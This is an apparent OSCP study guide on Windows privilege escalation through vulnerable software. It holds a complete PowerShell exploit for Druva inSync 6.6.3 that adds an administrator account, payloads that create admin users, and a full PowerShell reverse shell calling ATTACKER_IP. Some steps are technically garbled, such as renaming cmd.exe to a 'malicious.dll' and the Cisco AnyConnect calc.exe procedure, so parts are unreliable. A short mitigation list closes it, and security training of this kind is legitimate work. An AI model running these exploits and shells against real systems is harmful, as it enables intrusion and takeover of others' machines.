# Windows Vulnerable Software Exploitation

Unpatched or misconfigured software installed on Windows systems often provides opportunities for privilege escalation. This document covers techniques to identify and exploit vulnerable software.

## Identifying Installed Software

### Using WMIC

The Windows Management Instrumentation Command-line (WMIC) can enumerate installed software:

```cmd
# List all installed software
wmic product get name,version,vendor

# Filter results with findstr
wmic product get name,version,vendor | findstr "Specific_Software"
```

### Alternative Enumeration Methods

WMIC might not show all installed software. Additional enumeration techniques include:

```powershell
# PowerShell Get-ItemProperty
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize

Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize

# Check Program Files directories
dir "C:\Program Files" /b
dir "C:\Program Files (x86)" /b

# Look for running services
wmic service list brief

# Check startup items
wmic startup list full
```

## Researching Vulnerabilities

Once you've identified installed software and versions, search for known vulnerabilities:

1. **Exploit Database**: https://www.exploit-db.com/
2. **National Vulnerability Database**: https://nvd.nist.gov/vuln/search
3. **SecList**: https://seclists.org/
4. **Google Search**: `[software name] [version] exploit privilege escalation`

## Common Vulnerable Software Types

### 1. Remote Management Tools

Tools like VNC, TeamViewer, or remote administration software often run with SYSTEM privileges.

### 2. Backup Solutions

Backup software frequently runs with high privileges to access all files.

### 3. Database Software

MSSQL, MySQL, and others may run as SYSTEM or have misconfigured permissions.

### 4. Antivirus Software

Some antivirus products have had privilege escalation vulnerabilities.

### 5. Custom Enterprise Software

In-house or niche applications often have less security scrutiny.

## Case Study: Druva inSync 6.6.3

This is a detailed example of exploiting vulnerable software for privilege escalation.

### Vulnerability Details

Druva inSync 6.6.3 runs an RPC server on port 6064 with SYSTEM privileges (localhost only). The software is vulnerable to privilege escalation because:

1. It exposes an RPC procedure (number 5) that allows command execution
2. The server runs as SYSTEM, so commands inherit these privileges
3. An insufficient patch allowed path traversal to bypass command restrictions

### Exploitation Steps

1. **Identify the vulnerable service**:
   ```cmd
   wmic product get name,version,vendor | findstr "Druva"
   # Shows: Druva inSync 6.6.3
   
   # Check if the RPC server is running
   netstat -ano | findstr "6064"
   ```

2. **Create exploit script** (PowerShell):
   ```powershell
   $ErrorActionPreference = "Stop"
   
   # Command to execute - create admin user
   $cmd = "net user hacker Password123 /add & net localgroup administrators hacker /add"
   
   # Create socket and connect to the RPC server
   $s = New-Object System.Net.Sockets.Socket(
       [System.Net.Sockets.AddressFamily]::InterNetwork,
       [System.Net.Sockets.SocketType]::Stream,
       [System.Net.Sockets.ProtocolType]::Tcp
   )
   $s.Connect("127.0.0.1", 6064)
   
   # Prepare the RPC packets
   $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
   $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
   
   # Command using path traversal to bypass restrictions
   $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
   $length = [System.BitConverter]::GetBytes($command.Length);
   
   # Send the RPC packets
   $s.Send($header)
   $s.Send($rpcType)
   $s.Send($length)
   $s.Send($command)
   ```

3. **Verify exploitation success**:
   ```cmd
   net user hacker
   # Should show user details and group membership
   ```

### Technical Details

The exploit works by:
1. Connecting to the local RPC server on port 6064
2. Sending specific packets to invoke procedure 5
3. Using path traversal (`..\..\..`) to bypass path restrictions
4. Executing cmd.exe with a command to create a privileged user

## Case Study: Cisco AnyConnect Elevation of Privilege

The Cisco AnyConnect Secure Mobility Client for Windows has had multiple privilege escalation vulnerabilities.

### CVE-2020-3153 Exploitation

1. **Identify the vulnerability**:
   - Cisco AnyConnect before 4.8.02042 is vulnerable
   - The vulnerability is in the installer that runs with SYSTEM privileges

2. **Exploitation**:
   ```cmd
   # Extract acispc.dll to a writable location
   copy "C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\acispc.dll" C:\Temp\

   # Set up the required files for DLL hijacking
   mkdir "C:\Temp\Cisco\Cisco AnyConnect Secure Mobility Client\"
   copy calc.exe "C:\Temp\Cisco\Cisco AnyConnect Secure Mobility Client\calc.exe"

   # Trigger the vulnerability (repair installation)
   msiexec /fa "C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\Setup.msi"
   ```

## Case Study: Ricoh Printer Drivers

Ricoh printer drivers before 2020 had a privilege escalation vulnerability:

```powershell
# Check for vulnerable driver
Get-WmiObject Win32_Product | Where-Object {$_.Name -like "*RICOH*"} | Select-Object Name, Version

# The exploit involves replacing a DLL in the driver's directory
# Original exploit: https://www.exploit-db.com/exploits/48036
```

## General Exploitation Techniques

### 1. DLL Hijacking

If the vulnerable application loads DLLs without specifying the full path:

```cmd
# Create a malicious DLL
copy C:\Windows\System32\cmd.exe malicious.dll

# Place in location where application will find it before the legitimate DLL
```

### 2. Insecure File Permissions

If the application's executable has weak permissions:

```cmd
# Check permissions
icacls "C:\Program Files\Vulnerable App\app.exe"

# Replace with malicious executable
copy C:\Windows\System32\cmd.exe "C:\Program Files\Vulnerable App\app.exe" /Y
```

### 3. Unquoted Service Paths

Combine with service exploitation if vulnerable software installed as a service.

## Creating Malicious Payloads

For many exploits, you'll need to create custom payloads:

```cmd
# Payload to add a new administrator
echo net user hacker Password123 /add > payload.bat
echo net localgroup administrators hacker /add >> payload.bat

# PowerShell reverse shell
echo powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" > reverse-shell.ps1
```

## Prevention and Mitigation

To protect against vulnerable software exploitation:

1. **Keep software updated** with the latest security patches
2. **Implement application whitelisting** using AppLocker or Software Restriction Policies
3. **Use principle of least privilege** for service accounts
4. **Regularly audit installed software** for known vulnerabilities
5. **Implement proper access controls** on application directories
6. **Use security tools** like WMIC and PowerShell to regularly audit installed software

## OSCP Notes

For the OSCP exam, focus on:
- Simple, straightforward exploits that don't require complex setup
- Software that typically runs with SYSTEM privileges
- Applications with known version-specific vulnerabilities
- Exploits that can be executed with PowerShell or simple binaries 